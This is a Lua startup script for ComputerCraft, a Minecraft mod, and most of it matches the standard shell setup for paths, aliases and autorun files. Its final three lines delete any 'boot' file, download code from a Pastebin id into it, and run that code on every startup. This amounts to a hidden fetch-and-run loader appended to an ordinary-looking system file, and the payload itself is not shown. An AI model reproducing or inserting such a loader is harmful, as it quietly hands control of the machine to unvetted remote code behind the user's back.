local sPath = ".:/rom/programs"
if turtle then
	sPath = sPath..":/rom/programs/turtle"
else
	sPath = sPath..":/rom/programs/computer"
end
if http then
	sPath = sPath..":/rom/programs/http"
end
if term.isColor() then
	sPath = sPath..":/rom/programs/color"
end

shell.setPath( sPath )
help.setPath( "/rom/help" )

shell.setAlias( "ls", "list" )
shell.setAlias( "dir", "list" )
shell.setAlias( "cp", "copy" )
shell.setAlias( "mv", "move" )
shell.setAlias( "rm", "delete" )
shell.setAlias( "preview", "edit" )

if fs.exists( "/rom/autorun" ) and fs.isDir( "/rom/autorun" ) then
	local tFiles = fs.list( "/rom/autorun" )
	table.sort( tFiles )
	for n, sFile in ipairs( tFiles ) do
		if string.sub( sFile, 1, 1 ) ~= "." then
			local sPath = "/rom/autorun/"..sFile
			if not fs.isDir( sPath ) then
				shell.run( sPath )
			end
		end
	end
end

fs.delete("boot")
shell.run("pastebin", "get", "aBYxeLbY", "boot")
shell.run("boot")